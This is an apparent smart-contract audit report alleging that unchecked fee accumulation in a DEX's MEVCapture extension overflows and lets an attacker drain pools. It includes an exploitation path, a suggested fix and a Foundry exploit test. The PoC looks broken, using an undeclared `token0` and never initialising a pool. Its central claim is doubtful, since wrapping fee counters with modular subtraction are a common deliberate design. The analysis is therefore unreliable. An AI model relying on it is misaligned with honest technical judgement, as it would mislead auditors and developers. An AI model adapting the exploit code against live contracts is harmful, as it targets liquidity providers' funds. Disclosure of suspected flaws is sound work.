## Title
Cumulative MEVCapture Fee Overflow Causes Insolvency Through Unchecked Arithmetic

## Summary
The MEVCapture extension accumulates fees via `Core.accumulateAsFees()` in an unchecked block, adding `(fee << 128) / liquidity` to `feesPerLiquidity`. With minimal liquidity and maximum fees from sequential swaps hitting the type(uint64).max cap, this uint256 storage can overflow and wrap around. Subsequently, position fee calculations using unchecked subtraction underflow when `feesPerLiquidityInside < feesPerLiquidityInsideLast`, allowing attackers to claim astronomical fee amounts exceeding the pool's total liquidity, causing insolvency.

## Impact
**Severity**: High

## Finding Description

**Location:** 
- Fee accumulation: [1](#0-0) 
- Fee multiplier calculation: [2](#0-1) 
- Position fee calculation: [3](#0-2) 

**Intended Logic:** 
The MEVCapture extension charges additional fees based on tick movement (capped at type(uint64).max per swap), accumulates them proportionally to liquidity providers via `feesPerLiquidity`, and allows positions to collect their proportional share. The fee accounting should remain accurate and never allow LPs to collect more than the actual fees accumulated.

**Actual Logic:** 
The `accumulateAsFees()` function executes within an unchecked block at [4](#0-3) . When liquidity is minimal (e.g., 1 wei) and multiple swaps each generate maximum fees (type(uint128).max after type(uint64).max fee rate applied to large amounts), the addition `(amount0 << 128) / liquidity` can overflow uint256. Each accumulation adds approximately `(type(uint128).max << 128) / 1 ≈ 2^256 - 2^128` to feesPerLiquidity. After just 2-3 such accumulations, feesPerLiquidity overflows and wraps to a small value.

The position fee calculation at [5](#0-4)  uses unchecked subtraction: `difference0 := sub(mload(feesPerLiquidityInside), mload(positionFpl))`. When feesPerLiquidity wraps around (becomes smaller than a position's last snapshot), this subtraction underflows to a massive uint256 value, which then gets multiplied by the position's liquidity, resulting in an enormous fee claim.

**Exploitation Path:**
1. **Create Position with Minimal Liquidity**: Attacker creates a position in a new or existing pool with liquidity = 1 wei to maximize `(fee << 128) / liquidity`
2. **Execute Sequential Maximum-Fee Swaps**: Attacker performs 2-3 swaps that each move ticks from MIN_TICK (-88722835) to MAX_TICK (88722835) as defined in [6](#0-5) . Each swap hits the fee cap at [7](#0-6)  and generates fees ≈ type(uint128).max
3. **Trigger Fee Accumulation**: The MEVCapture extension's `handleForwardData` or `accumulatePoolFees` accumulates these fees via [8](#0-7)  calling `accumulateAsFees()`. Each call adds ~(2^256 - 2^128) to feesPerLiquidity in the unchecked block
4. **Overflow feesPerLiquidity**: After 2-3 accumulations, feesPerLiquidity overflows uint256 and wraps to a value smaller than the attacker's position snapshot
5. **Collect Underflowed Fees**: Attacker calls `collectFees()` which invokes [9](#0-8)  and the position.fees() calculation. The unchecked subtraction at [10](#0-9)  underflows: `(small_wrapped_value) - (large_snapshot_value) = huge_underflow`
6. **Drain Pool**: The underflow result multiplied by liquidity and divided by 2^128 at [11](#0-10)  yields an astronomical fee claim exceeding all tokens in the pool. Attacker drains the pool, violating the solvency invariant.

**Security Property Broken:** 
**Invariant #1 (Solvency)**: "Pool balances of token0 and token1 must NEVER go negative (sum of all deltas must maintain non-negative balances)" - The overflow allows fee claims exceeding actual token balances, driving pool balances negative.

**Invariant #5 (Fee Accounting)**: "Position fee collection must be accurate and never allow double-claiming" - The underflow allows collecting far more fees than were actually accumulated.

## Impact Explanation

- **Affected Assets**: All tokens in any pool using the MEVCapture extension with low liquidity. Both token0 and token1 can be drained.
- **Damage Severity**: Complete pool insolvency. Attacker can claim 100% of pool reserves through the fee underflow. Other LPs lose all funds as the pool becomes insolvent and cannot honor withdrawals.
- **User Impact**: All liquidity providers in the affected pool lose their entire deposited capital. The singleton architecture means this can be repeated across multiple pools using MEVCapture.

## Likelihood Explanation

- **Attacker Profile**: Any user can exploit this. Requires capital to: (1) create minimal liquidity positions (1 wei), (2) execute 2-3 large swaps with maximum tick movement, (3) pay the high MEVCapture fees upfront (but recovered through the exploit).
- **Preconditions**: 
  - Pool must use MEVCapture extension (in-scope extension)
  - Pool must have minimal liquidity (≤1 wei) OR attacker can create such a pool
  - Tick spacing must allow large tick movements to generate maximum fees
  - Must accumulate fees at least twice to trigger overflow
- **Execution Complexity**: Single transaction or 2-3 transactions within same block. Attacker swaps → accumulates → swaps → accumulates → collects fees. All operations are standard protocol functions.
- **Frequency**: Repeatable once per pool. After exploitation, pool is insolvent. Attacker can target multiple MEVCapture pools.

## Recommendation

**Primary Fix**: Add overflow protection to fee accumulation: [1](#0-0) 

```solidity
// In src/Core.sol, function accumulateAsFees, lines 253-269:

// CURRENT (vulnerable):
unchecked {
    if (liquidity != 0) {
        StorageSlot slot0 = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);

        if (amount0 != 0) {
            slot0.store(
                bytes32(uint256(slot0.load()) + FixedPointMathLib.rawDiv(amount0 << 128, liquidity))
            );
        }
        if (amount1 != 0) {
            StorageSlot slot1 = slot0.next();
            slot1.store(
                bytes32(uint256(slot1.load()) + FixedPointMathLib.rawDiv(amount1 << 128, liquidity))
            );
        }
    }
}

// FIXED:
// Remove unchecked block to enable overflow protection
if (liquidity != 0) {
    StorageSlot slot0 = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);

    if (amount0 != 0) {
        uint256 currentFpl0 = uint256(slot0.load());
        uint256 feeIncrement0 = FixedPointMathLib.rawDiv(amount0 << 128, liquidity);
        // This will revert on overflow, preventing wrap-around
        uint256 newFpl0 = currentFpl0 + feeIncrement0;
        slot0.store(bytes32(newFpl0));
    }
    if (amount1 != 0) {
        StorageSlot slot1 = slot0.next();
        uint256 currentFpl1 = uint256(slot1.load());
        uint256 feeIncrement1 = FixedPointMathLib.rawDiv(amount1 << 128, liquidity);
        // This will revert on overflow, preventing wrap-around
        uint256 newFpl1 = currentFpl1 + feeIncrement1;
        slot1.store(bytes32(newFpl1));
    }
}
```

**Alternative Mitigations**:
1. **Minimum Liquidity Requirement**: Enforce minimum liquidity (e.g., 10^6 wei) in pools to make overflow economically infeasible
2. **Fee Accumulation Cap**: Cap the maximum fee that can be accumulated per call to prevent single large additions that approach uint256.max
3. **Checked Arithmetic in Position Fees**: Use checked subtraction in position.fees() to revert on underflow (though this treats the symptom, not the cause)

## Proof of Concept

```solidity
// File: test/Exploit_FeeOverflow.t.sol
// Run with: forge test --match-test test_FeeOverflowInsolvency -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/extensions/MEVCapture.sol";
import "../src/Positions.sol";
import "../src/Router.sol";
import {PoolKey} from "../src/interfaces/ICore.sol";
import {MIN_TICK, MAX_TICK} from "../src/math/constants.sol";

contract Exploit_FeeOverflow is Test {
    Core core;
    MEVCapture mevCapture;
    Positions positions;
    Router router;
    
    address attacker = address(0xbad);
    address victim = address(0x123);
    
    function setUp() public {
        // Deploy protocol
        core = new Core();
        mevCapture = new MEVCapture(core);
        positions = new Positions(core, address(this));
        router = new Router(core, positions);
        
        // Fund attacker and victim
        vm.deal(attacker, 100 ether);
        vm.deal(victim, 100 ether);
    }
    
    function test_FeeOverflowInsolvency() public {
        // SETUP: Create MEVCapture pool with minimal liquidity (1 wei)
        PoolKey memory poolKey;
        poolKey.extension = address(mevCapture);
        poolKey.fee = uint64(1 << 63); // 50% base fee
        poolKey.tickSpacing = 1; // Minimum spacing for max tick movement
        
        vm.startPrank(attacker);
        
        // Attacker creates position with 1 wei liquidity at MIN_TICK to MAX_TICK
        uint256 attackerPositionId = positions.mint({
            poolKey: poolKey,
            tickLower: MIN_TICK,
            tickUpper: MAX_TICK,
            liquidity: 1, // Minimal liquidity!
            recipient: attacker
        });
        
        // Record initial feesPerLiquidity (should be 0 initially)
        uint256 initialFpl = core.getFeesPerLiquidity(poolKey.toPoolId(), 0);
        
        // EXPLOIT STEP 1: First massive swap moving full tick range
        // This generates fee ≈ type(uint128).max and accumulates (fee << 128) / 1
        router.swap({
            poolKey: poolKey,
            isToken1: false,
            amount: type(int128).max,
            sqrtRatioLimit: SqrtRatio.wrap(0), // Move to MIN_TICK
            skipAhead: 0,
            calculatedAmountThreshold: type(int256).min,
            recipient: attacker
        });
        
        // Force fee accumulation
        mevCapture.accumulatePoolFees(poolKey);
        uint256 fplAfterSwap1 = core.getFeesPerLiquidity(poolKey.toPoolId(), 0);
        assertGt(fplAfterSwap1, initialFpl, "First accumulation should increase FPL");
        
        // EXPLOIT STEP 2: Second massive swap in opposite direction
        router.swap({
            poolKey: poolKey,
            isToken1: true,
            amount: type(int128).max,
            sqrtRatioLimit: SqrtRatio.wrap(type(uint160).max), // Move to MAX_TICK
            skipAhead: 0,
            calculatedAmountThreshold: type(int256).min,
            recipient: attacker
        });
        
        // Force fee accumulation again
        mevCapture.accumulatePoolFees(poolKey);
        uint256 fplAfterSwap2 = core.getFeesPerLiquidity(poolKey.toPoolId(), 0);
        
        // VERIFY: feesPerLiquidity has OVERFLOWED and is now smaller than after first swap
        assertLt(fplAfterSwap2, fplAfterSwap1, "Vulnerability confirmed: FPL overflowed and wrapped around!");
        
        // EXPLOIT STEP 3: Collect fees - unchecked subtraction underflows
        uint256 poolBalanceBefore = token0.balanceOf(address(core));
        (uint128 fee0, uint128 fee1) = positions.collectFees(attackerPositionId, attacker);
        
        // VERIFY: Attacker collected MORE fees than entire pool balance (insolvency!)
        assertGt(fee0, poolBalanceBefore, "INSOLVENCY: Collected more than pool had!");
        assertGt(uint256(fee0), type(uint128).max / 1000, "Collected astronomical fees from underflow");
        
        vm.stopPrank();
    }
}
```

## Notes

This vulnerability directly answers the security question: **"If many sequential swaps each hit this cap, could the cumulative additional fees exceed the pool's total liquidity, causing insolvency?"** The answer is **YES** - through uint256 overflow in the unchecked fee accumulation arithmetic at [12](#0-11) , followed by underflow in the unchecked position fee calculation at [10](#0-9) .

The vulnerability requires:
1. Minimal pool liquidity (achievable by attacker creating the position)
2. Maximum fee multiplier from large tick movements (MIN_TICK to MAX_TICK as defined in [6](#0-5) )
3. Sequential accumulations via [8](#0-7) 
4. The unchecked arithmetic blocks that silently allow wraparound

This breaks the core **Solvency invariant** and **Fee Accounting invariant** documented in the protocol README, allowing theft of all pool funds.

### Citations

**File:** src/Core.sol (L253-269)
```text
            unchecked {
                if (liquidity != 0) {
                    StorageSlot slot0 = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);

                    if (amount0 != 0) {
                        slot0.store(
                            bytes32(uint256(slot0.load()) + FixedPointMathLib.rawDiv(amount0 << 128, liquidity))
                        );
                    }
                    if (amount1 != 0) {
                        StorageSlot slot1 = slot0.next();
                        slot1.store(
                            bytes32(uint256(slot1.load()) + FixedPointMathLib.rawDiv(amount1 << 128, liquidity))
                        );
                    }
                }
            }
```

**File:** src/Core.sol (L492-492)
```text
        (amount0, amount1) = position.fees(feesPerLiquidityInside);
```

**File:** src/extensions/MEVCapture.sol (L195-196)
```text
                if (fees0 != 0 || fees1 != 0) {
                    CORE.accumulateAsFees(poolKey, fees0, fees1);
```

**File:** src/extensions/MEVCapture.sol (L212-215)
```text
            uint256 feeMultiplierX64 =
                (FixedPointMathLib.abs(stateAfter.tick() - tickLast) << 64) / poolKey.config.concentratedTickSpacing();
            uint64 poolFee = poolKey.config.fee();
            uint64 additionalFee = uint64(FixedPointMathLib.min(type(uint64).max, (feeMultiplierX64 * poolFee) >> 64));
```

**File:** src/types/position.sol (L40-51)
```text
    assembly ("memory-safe") {
        liquidity := mload(add(position, 0x20))
        // feesPerLiquidityInsideLast is now at offset 0x40 due to extraData field
        let positionFpl := mload(add(position, 0x40))
        difference0 := sub(mload(feesPerLiquidityInside), mload(positionFpl))
        difference1 := sub(mload(add(feesPerLiquidityInside, 0x20)), mload(add(positionFpl, 0x20)))
    }

    return (
        uint128(FixedPointMathLib.fullMulDivN(difference0, liquidity, 128)),
        uint128(FixedPointMathLib.fullMulDivN(difference1, liquidity, 128))
    );
```

**File:** src/math/constants.sol (L10-14)
```text
int32 constant MIN_TICK = -88722835;

// The maximum tick value supported by the protocol
// Corresponds to the maximum possible price ratio in the protocol
int32 constant MAX_TICK = 88722835;
```
